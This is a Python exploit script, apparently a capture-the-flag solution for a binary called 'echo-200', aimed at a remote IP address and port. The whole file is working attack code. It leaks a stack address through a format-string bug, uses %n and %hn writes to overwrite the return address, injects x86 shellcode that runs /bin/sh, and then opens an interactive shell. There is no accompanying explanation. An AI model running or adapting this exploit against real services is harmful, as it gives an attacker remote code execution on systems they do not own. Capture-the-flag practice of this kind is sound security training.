#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'ByStudent'
from zio import *
from pwn import *
# target = "./echo-200"
target = ("106.75.9.11", 2000)
def get_io(target):
   r_m = COLORED(RAW, "green")
   w_m = COLORED(RAW, "blue")
   io = zio(target, timeout= 9999, print_read = r_m, print_write = w_m)
   return io
def pwn(io):
   #sample
   io.read_until("bytes\n")
   payload = "%5$p"
   io.writeline(payload)
   data = io.read_until("\n")[:-1]
   buff_addr = int(data, 16)
   begin_pos = 7
   io.read_until("bytes\n")
   payload = ""
   payload += l32(buff_addr - 0xc)
   payload += "%511c"
   payload += "%7$n"
   io.writeline(payload)
   io.read_until("bytes\n")
   payload = ""
   payload += l32(buff_addr - 0xc)
   payload += "%511c"
   payload += "%7$n"
   io.writeline(payload)
   shellcode = 'h/sh\x00h/bin\xb8\x0b\x00\x00\x00\x89\xe3\xb9\x00\x00\x00\x00\xba\x00\x00\x00\x00\xcd\x80'
   shellcode_addr = buff_addr + 0x80
   low_part = shellcode_addr & 0xffff
   high_part = (shellcode_addr>>16) & 0xffff
   ret_pos = buff_addr - (0xffb3c70c - 0xffb3c6ec)
   payload = ""
   payload += "%%%dc%%%d$hn"%(low_part, begin_pos + 8)
   payload += "%%%dc%%%d$hn"%(high_part - low_part, begin_pos + 9)
   payload = payload.ljust(0x20, 'a')
   payload += l32(ret_pos)
   payload += l32(ret_pos+2)
   payload = payload.ljust(0x80, 'a')
   payload += shellcode
   #io.gdb_hint()
   io.writeline(payload)
   io.writeline("id")
   io.interact()
io = get_io(target)
pwn(io)
